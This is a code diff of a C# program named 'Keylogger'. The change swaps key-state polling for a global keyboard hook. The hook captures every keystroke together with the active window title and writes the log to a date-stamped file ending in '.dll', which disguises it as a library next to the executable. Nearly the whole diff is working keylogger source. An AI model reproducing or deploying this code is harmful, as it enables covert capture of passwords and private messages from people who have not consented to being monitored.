@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Keystroke.API;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -13,8 +14,8 @@ namespace Keylogger
     class Program
     {   
         // Get keys
-        [DllImport("user32.dll")]
-        public static extern int GetAsyncKeyState(Int32 i);
+        /**[DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);**/
 
         //Get window titles
         [DllImport("user32.dll")]
@@ -31,9 +32,42 @@ namespace Keylogger
 
         private void start()
         {
-            string currentWindowTitle = "";
+            string log = string.Empty;
+            string currentWindowTitle = string.Empty;
+
+            using (var api = new KeystrokeAPI())
+            {
+                api.CreateKeyboardHook((character) => 
+                {
+                    // Clean the key
+                    string character2 = cleanKey(character.ToString());
+
+                    // Get the foreground window's title : https://stackoverflow.com/questions/115868/how-do-i-get-the-title-of-the-current-active-window-using-c
+                    string windowTitle = getForegroundWindowTitle();
+                    if (windowTitle != currentWindowTitle && windowTitle != "")
+                    {
+                        currentWindowTitle = windowTitle;
+                        log += $"\n\n[Foreground Window : {currentWindowTitle}]\n";
+                    }
+
+                    // Update the log variable
+                    log += character2;
+
+                    // Write logs : https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
+                    string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
+                    string fileName = DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
+                    File.WriteAllText(Path.Combine(path, fileName), log);
+
+
+                    Console.WriteLine(log);
+                });
+
+                Application.Run();
+            }
+
+            /**string currentWindowTitle = "";
             bool isShift = false;
-            bool isCapital = false;
+            bool isCapital = false;f
             string log = "";
 
             while (true)
@@ -133,15 +167,17 @@ namespace Keylogger
                         Console.WriteLine(log);
                     }
                 }
-            }
+            }**/
         }
 
-
+        public string cleanKey(string character)
+        {
+            if (character == "<enter>") { character = "\n"; }
+            return character;
+        }
         
         public string getForegroundWindowTitle()
         {
-            // https://stackoverflow.com/questions/115868/how-do-i-get-the-title-of-the-current-active-window-using-c
-
             const int nChars = 256;
             StringBuilder Buff = new StringBuilder(nChars);
             IntPtr handle = GetForegroundWindow();
